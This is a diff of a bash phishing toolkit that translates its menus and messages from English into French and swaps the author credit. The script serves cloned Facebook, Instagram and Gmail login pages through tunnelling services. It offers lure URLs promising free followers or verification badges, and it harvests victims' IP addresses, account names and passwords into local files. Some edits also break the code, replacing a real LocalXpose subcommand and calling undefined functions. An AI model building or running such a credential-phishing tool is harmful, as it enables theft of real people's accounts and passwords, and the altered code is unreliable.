@@ -82,32 +82,32 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 
-		${GREEN}░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░
-		${GREEN}██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗
-		${GREEN}███████║██║░░░██║░░░██║░░░██║░░██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝
-		${GREEN}██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗
-		${GREEN}██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║
-		${GREEN}╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
-		${GREEN}
+		${RED} _____  ___        __        ________  __   ___       __        ________  ________     
+		${RED}(\"   \|"  \      /""\      /"       )|/"| /  ")     /""\      /"       )/"       )    
+		${RED}|.\\   \    |    /    \    (:   \___/ (: |/   /     /    \    (:   \___/(:   \___/  
+		${RED}|: \.   \\  |   /' /\  \    \___  \   |    __/     /' /\  \    \___  \   \___  \    
+		${RED}|.  \    \. |  //  __'  \    __/  \\  (// _  \    //  __'  \    __/  \\   __/  \\   
+		${RED}|    \    \ | /   /  \\  \  /" \   :) |: | \  \  /   /  \\  \  /" \   :) /" \   :) 
+		${RED} \___|\____\)(___/    \___)(_______/  (__|  \__)(___/    \___)(_______/ (_______/  
 		                                    ${BLUE}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by CODING RANJITH (C.RANJITH KUMAR)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} CE TOOL A ETE CREER PAR NASKASS !${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}█████████████████████████████████████████████████████████████
-		${BLUE}██▀▄─██▄─██─▄█─▄─▄─█─▄▄─█▄─▄▄─█─█─█▄─▄█─▄▄▄▄█─█─█▄─▄▄─█▄─▄▄▀█
-		${BLUE}██─▀─███─██─████─███─██─██─▄▄▄█─▄─██─██▄▄▄▄─█─▄─██─▄█▀██─▄─▄█
-		${BLUE}▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▀▄▄▄▀▀▀▄▀▄▀▄▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▀▄▄▀    ${WHITE} ${__version__}
+		${BLUE} _____ _____ _____ _____ _____ _____ _____  
+		${BLUE}|   | |  _  |   __|  |  |  _  |   __|   __| 
+		${BLUE}| | | |     |__   |    -|     |__   |__   | 
+		${BLUE}|_|___|__|__|_____|__|__|__|__|_____|_____|     ${WHITE} ${__version__}
 	EOF
 }
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installation des paquets..."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
@@ -122,12 +122,12 @@ dependencies() {
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Paquet déjà installé."
 	else
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installation du paquet : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -141,7 +141,7 @@ dependencies() {
 				elif [[ $(command -v yum) ]]; then
 					sudo yum -y install "$pkg"
 				else
-					echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Unsupported package manager, Install packages manually."
+					echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Paquet pas supporté, Installez le fichier manuellement."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -173,7 +173,7 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Error occured while downloading ${output}."
+		echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Erreur pendant l'installation ) ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -181,9 +181,9 @@ download() {
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok est déjà installé."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installation de ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
@@ -200,9 +200,9 @@ install_ngrok() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared est déjà installé."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installation de Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -219,9 +219,9 @@ install_cloudflared() {
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose est déjà installé."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installation de LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -238,7 +238,7 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Merci d'utiliser mon tool. Bonne journée !.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -260,7 +260,7 @@ about() {
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} CHOISIT UNE 𝙊𝙋𝙏𝙄𝙊𝙉 : ${BLUE}"
+	read -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} CHOISI UNE OPTION : ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -278,10 +278,10 @@ HOST='127.0.0.1'
 PORT='8080'
 
 setup_site() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Création du serveur..."${WHITE}
 	cp -rf sites/"$website"/* .server/www
 	cp -f  sites/ip.php .server/www/
-	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Lancement du serveur PHP..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
@@ -289,19 +289,19 @@ setup_site() {
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} l'IP de la Victime : ${BLUE}$IP"
+	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Sauvegarder dans : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	ACCOUNT=$(grep -o 'Compte:.*' .server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Mot de passe:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Account : ${ORANGE}$ACCOUNT"
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Password: ${ORANGE}$PASSWORD"
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Compte : ${ORANGE}$ACCOUNT"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Mot de passe: ${ORANGE}$PASSWORD"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Sauvegardé dans : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Attendez pour avoir les infos, ${BLUE}Ctrl + C ${ORANGE}Pour partir. "
 }
@@ -317,7 +317,7 @@ capture_data() {
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${ORANGE} Login info Found !!"
+			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${ORANGE} Les infos de Connexion on été trouvés !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -327,12 +327,12 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Création... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Tu veux changer la région de ton Ngrok? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Lancement de Ngrok..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
@@ -351,7 +351,7 @@ start_ngrok() {
 ## Start Cloudflared
 start_cloudflared() { 
     rm .cld.log > /dev/null 2>&1 &
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${ORANGE}( ${CYAN}http://$HOST:$PORT ${ORANGE})"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Création... ${ORANGE}( ${CYAN}http://$HOST:$PORT ${ORANGE})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Lancement de Cloudflared..."
 
@@ -375,12 +375,12 @@ localxpose_auth() {
 	sleep 1
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
-	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+	[ "$(./.server/loclx STATUS DE COMPTE | grep Error)" ] && {
+		echo -e "\n\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Creez un compte sur ${ORANGE}localxpose.io${GREEN} Et copie la clé (token)\n"
 		sleep 3
-		read -p "${WHITE}[${GREEN}-${WHITE}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		read -p "${WHITE}[${GREEN}-${WHITE}]${ORANGE} Mettre le clé :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+			echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Vous devez mettre la clé (token)." ; sleep 2 ; tunnel_menu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -389,12 +389,12 @@ localxpose_auth() {
 
 ## Start LocalXpose (Again...)
 start_loclx() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${CYAN}( ${ORANGE}http://$HOST:$PORT ${CYAN})"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Création... ${CYAN}( ${ORANGE}http://$HOST:$PORT ${CYAN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} Vous voulez changer la région de seveur de Loclx? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Launching LocalXpose..."
+	echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Lancement de LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -403,7 +403,7 @@ start_loclx() {
 	fi
 
 	{ sleep 12; clear; banner_small; }
-	loclx_url=$(cat .server/.loclx | grep -Eo '[-0-9a-z]+.[-0-9a-z]+(.loclx.io)') # Somebody fix this crappy regex :(
+	loclx_url=$(cat .server/.loclx | grep -Eo '[-0-9a-z]+.[-0-9a-z]+(.loclx.io)') # Quelqu'un répare ce REGEX :(
 	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}http://$loclx_url"
 	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$loclx_url"
 	capture_data
@@ -411,10 +411,10 @@ start_loclx() {
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Création... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Successfully Hosted at : ${GREEN}${ORANGE}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Terminé ! Le port est : ${GREEN}${ORANGE}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
@@ -430,7 +430,7 @@ tunnel_menu() {
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼 𝙋𝙊𝙍𝙏 𝙁𝙊𝙍𝙒𝘼𝙍𝘿𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙄𝘾𝙀 : ${RED}"
+	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} SELECTIONNEZ UN PORT : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -442,7 +442,7 @@ tunnel_menu() {
 		4 | 04)
 			start_loclx;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Option Invalide, veuillez réesayer..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
@@ -451,14 +451,14 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Traditional Login Page
-		${WHITE}[${GREEN}02${WHITE}]${BLUE} Advanced Voting Poll Login Page
-		${WHITE}[${GREEN}03${WHITE}]${BLUE} Fake Security Login Page
-		${WHITE}[${GREEN}04${WHITE}]${BLUE} Facebook Messenger Login Page
+		${WHITE}[${GREEN}01${WHITE}]${BLUE} Site de connexion normale (recommandé)
+		${WHITE}[${GREEN}02${WHITE}]${BLUE} Site de connexion avancé
+		${WHITE}[${GREEN}03${WHITE}]${BLUE} Site de connexion ( alerte de sécurité)
+		${WHITE}[${GREEN}04${WHITE}]${BLUE} Site de connexion Facebook
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
+	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} CHOISI UNE OPTION : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -478,7 +478,7 @@ site_facebook() {
 			mask='http://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Option invalide, veuillez reesayez..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -487,14 +487,14 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Traditional Login Page
-		${WHITE}[${GREEN}02${WHITE}]${BLUE} Auto Followers Login Page
-		${WHITE}[${GREEN}03${WHITE}]${BLUE} 1000 Followers Login Page
-		${WHITE}[${GREEN}04${WHITE}]${BLUE} Blue Badge Verify Login Page
+		${WHITE}[${GREEN}01${WHITE}]${BLUE} Site de connexion normale
+		${WHITE}[${GREEN}02${WHITE}]${BLUE} Site d'abonnés automatique
+		${WHITE}[${GREEN}03${WHITE}]${BLUE} Site pour avoir 1000 abonnés
+		${WHITE}[${GREEN}04${WHITE}]${BLUE} Site pour avoir la vérification instagram
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
+	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} CHOISI UNE OPTION : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -514,7 +514,7 @@ site_instagram() {
 			mask='http://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Option invalide, veuillez reesayez..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
@@ -523,13 +523,13 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Gmail Old Login Page
-		${WHITE}[${GREEN}02${WHITE}]${BLUE} Gmail New Login Page
-		${WHITE}[${GREEN}03${WHITE}]${BLUE} Advanced Voting Poll
+		${WHITE}[${GREEN}01${WHITE}]${BLUE} Site de connexion ANCIEN
+		${WHITE}[${GREEN}02${WHITE}]${BLUE} Site de connexion normale
+		${WHITE}[${GREEN}03${WHITE}]${BLUE} Site de connexion avancée
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
+	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} CHOISI UNE OPTION : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -545,7 +545,7 @@ site_gmail() {
 			mask='http://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Option invalide, veuillez reesayez..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -556,9 +556,9 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${WHITE}[${GREEN}::${WHITE}]${BLUE} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙑𝙄𝘾𝙏𝙄𝙈 ${WHITE}[${GREEN}::${WHITE}]${BLUE}
+		${WHITE}[${GREEN}::${WHITE}]${BLUE} CHOISI UNE ATTAQUE POUR TA VICTIME ${WHITE}[${GREEN}::${WHITE}]${BLUE}
 
-		${WHITE}[${GREEN}::${WHITE}]${RED} 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂-𝙈𝙊𝘿𝙐𝙇𝙀𝙎: ${WHITE}[${GREEN}::${WHITE}]${RED}
+		${WHITE}[${GREEN}::${WHITE}]${RED} MODULE D'ATTAQUES: ${WHITE}[${GREEN}::${WHITE}]${RED}
 
 		${WHITE}[${GREEN}01${WHITE}]${BLUE} Facebook      ${WHITE}[${GREEN}02${WHITE}]${BLUE} Instagram       ${WHITE}[${GREEN}03${WHITE}]${BLUE} Google
 
@@ -569,11 +569,11 @@ main_menu() {
 		${WHITE}[${GREEN}10${WHITE}]${BLUE} Mediafire     ${WHITE}[${GREEN}11${WHITE}]${BLUE} Github
 
 
-		${WHITE}[${GREEN}99${WHITE}]${BLUE} About         ${WHITE}[${GREEN}00${WHITE}]${BLUE} Exit
+		${WHITE}[${GREEN}99${WHITE}]${BLUE} INFO         ${WHITE}[${GREEN}00${WHITE}]${BLUE} Quitter...
 
 	EOF
 	
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
+	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} CHOISI UNE OPTION : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -617,11 +617,11 @@ main_menu() {
 
 
 		99)
-			about;;
+			INFO;;
 		0 | 00 )
-			msg_exit;;
+			Quitter;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Option invalide, veuillez reesayez..."
 			{ sleep 1; main_menu; };;
 	
 	esac
